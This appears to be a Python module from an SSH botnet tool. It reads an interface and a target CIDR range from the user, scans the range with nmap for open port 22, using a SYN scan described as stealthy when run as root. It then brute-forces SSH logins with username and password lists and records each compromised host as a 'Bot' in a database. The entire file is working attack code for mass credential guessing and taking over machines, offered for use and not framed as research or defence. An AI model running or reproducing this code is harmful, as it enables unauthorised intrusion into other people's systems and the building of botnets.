import paramiko
from modules import printer,db
import netaddr
import os
import netifaces as ni
import socket
import nmap
import sys
from modules import bot
from time import sleep

db.connect()
db.create_table()
ssh=paramiko.SSHClient()
hosts=[]
user=os.getuid()
discover=nmap.PortScanner()
myip=""
_interface=""
_cidr_ip=""

def ip_finder(_interface):
    ni.ifaddresses(_interface)
    global myip
    myip=ni.ifaddresses(_interface)[ni.AF_INET][0]['addr']
    
    return myip
    

def netdiscover(_interface,_cidr_ip):
    """netdiscover
    This function takes in the interface and CIDR and
    adds hosts to the list of online hosts with port 22 opened
    """
    printer.print_info(printer.color_blue("Checking our ip so as to exlude ourself from the scan"))
    printer.print_success(printer.color_cyan("Ip found %s"%myip))
    printer.print_info("Checking for root access So as to use a fatser and stealthy method")
    if (user == 0):
        printer.print_success("Current user is root")
        printer.print_info("Scanning the network for hosts")
        discover.scan(_cidr_ip,ports='22',arguments='-sS --exclude %s'%myip)
        ip_addresses=discover.all_hosts()
        for i in ip_addresses:
            state=discover[i]['tcp'][22]['state']
            if(state=='open'):
                hosts.append(i)
        printer.print_info(printer.color_cyan("scan complete"))
            
    else:
        printer.print_error("Current user is not root")
        printer.print_info("Using default user to scan")
        discover.scan(_cidr_ip,ports='22',arguments='--exclude %s'%myip)
        ip_addresses=discover.all_hosts()
        for i in ip_addresses:
            state=discover[i]['tcp'][22]['state']
            if(state=='open'):
                hosts.append(i)
        printer.print_info(printer.color_cyan("scan complete"))
        

def portscanner(ip):
    """Port scanner
    This function Takes in an ip
    scans for ssh port and reutns true if open
    """
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        result=sock.connect_ex((ip,22))
    except:
        return False
    if(result == 0):
        return(True)
    else:
        return(False)

def hostfinder(_cidr_ip,myip):
    """This function takes in an CIDR ip and returns 
    the online Hosts
    """
    print("printing ip %s and cidr %s"%(_cidr_ip,myip))
    discover.scan(_cidr_ip,arguments='-sn --exclude %s'%myip)
    ip_addresses=discover.all_hosts()
    
    return ip_addresses
    
def addbot(address,port):
    usernames=['username1','username2']
    passwords=['password1','password2']
    printer.print_info("Sleeping for two seconds to start the attack")    
    sleep(2)
    status=printer.color_cyan("Connecting to Bot %s" % address)
    printer.print_success(status)
    brk=False
    for i in usernames:
        status="Bruteforcing user %s"%i
        printer.print_info(status)
        for j in passwords:
            username=printer.color_red(i)
            passwd=printer.color_blue(j)
            printer.print_info("Connecting to Bot %s using username %s And password %s"%(address,username,passwd))
            if(bot.connect(address,port,i,j,"")):
                status=printer.color_cyan("Connected to Bot %s "%address)
                printer.print_success(status)
                printer.print_info("Password found")
                db.insert_with_password(address,port,i,j)
                status=printer.color_blue("Bot details inserted into DB")
                printer.print_success(status)
                brk=True
                break
        if(brk):
            break    
    
def main():
    global _interface,_cidr_ip,myip
    _interface = input(printer.color_cyan("Enter the network interface")+":>") 
    _cidr_ip = input(printer.color_blue("Enter the IP CIDR Target")+":>")
    myip=ip_finder(_interface)
    netdiscover(_interface,_cidr_ip)
    for i in hosts:
        addbot(i,22)


if __name__ == "__main__":
    try:
        main()
            
    except KeyboardInterrupt:
        print("\nCTRL+C pressed Do you wish to Exit?")
        if(input("\nEnter y or n>")=="y"):
            sys.exit(0)
        else:
            main()
